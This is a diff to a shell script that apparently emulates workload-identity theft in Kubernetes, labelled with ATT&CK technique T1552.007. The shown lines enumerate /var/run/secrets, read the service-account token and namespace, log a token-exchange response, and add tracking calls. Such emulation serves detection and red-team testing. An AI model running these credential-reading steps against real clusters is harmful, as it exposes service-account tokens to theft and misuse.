@@ -36,6 +36,7 @@ if [ ! -f "${SA_DIR}/token" ]; then
     exit 1
 fi
 find /var/run/secrets -type f 2>/dev/null | tee -a "$LOG"
+st_mark T1552.007 "read-token"; act_here "cat service-account token" "${SA_DIR}/token"
 TOKEN="$(cat "${SA_DIR}/token")"
 NAMESPACE="$(cat "${SA_DIR}/namespace" 2>/dev/null || echo unknown)"
 say "discovered token for namespace='${NAMESPACE}' (${#TOKEN} chars)"
@@ -47,3 +48,5 @@ say "token-exchange response: $RESP"
 
 step "Done — workload-identity-theft emulation complete."
 say "artifacts: $LOG  (server-side log: results/control_api_beacons.log)"
+
+act_summary
